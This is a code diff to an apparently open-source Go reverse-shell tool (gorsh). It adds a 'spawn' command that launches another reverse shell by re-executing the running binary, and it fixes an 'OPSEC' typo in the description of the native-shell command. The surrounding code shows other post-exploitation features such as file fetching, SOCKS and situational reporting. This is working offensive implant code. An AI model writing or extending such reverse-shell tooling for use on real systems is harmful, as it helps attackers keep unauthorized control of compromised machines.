@@ -5,6 +5,7 @@ import (
 	"fmt"
 	"io/ioutil"
 	"os"
+	"os/exec"
 	"os/user"
 	"path/filepath"
 
@@ -13,6 +14,7 @@ import (
 	"github.com/audibleblink/gorsh/internal/sitrep"
 	"github.com/audibleblink/gorsh/internal/socks"
 	"github.com/audibleblink/gorsh/internal/zip"
+	"github.com/shirou/gopsutil/process"
 )
 
 type cmdFunc func(...string) string
@@ -42,9 +44,16 @@ var commands []*command
 func init() {
 	commands = []*command{
 		&command{
+			Name:     "spawn",
+			ArgHint:  "",
+			Desc:     "Start another reverse shell",
+			ArgCount: 0,
+			ArgReq:   false,
+			cmdFn:    spawnFn},
+		&command{
 			Name:     "shell",
 			ArgHint:  "",
-			Desc:     "Drops into a native shell. Mind you OPSEC",
+			Desc:     "Drops into a native shell. Mind your OPSEC",
 			ArgCount: 0,
 			ArgReq:   false,
 			cmdFn:    nil},
@@ -251,6 +260,23 @@ func fetchFn(file ...string) string {
 	output := fmt.Sprintf("%d bytes copied to %s",
 		bytes, file[1])
 	return output
+}
+
+func spawnFn(file ...string) string {
+	pid := int32(os.Getpid())
+	proc, err := process.NewProcess(pid)
+	if err != nil {
+		return err.Error()
+	}
+
+	p, err := proc.Exe()
+	if err != nil {
+		return err.Error()
+	}
+
+	cmd := exec.Command(p)
+	cmd.Start()
+	return ""
 }
 
 func sitrepFn(argv ...string) string {
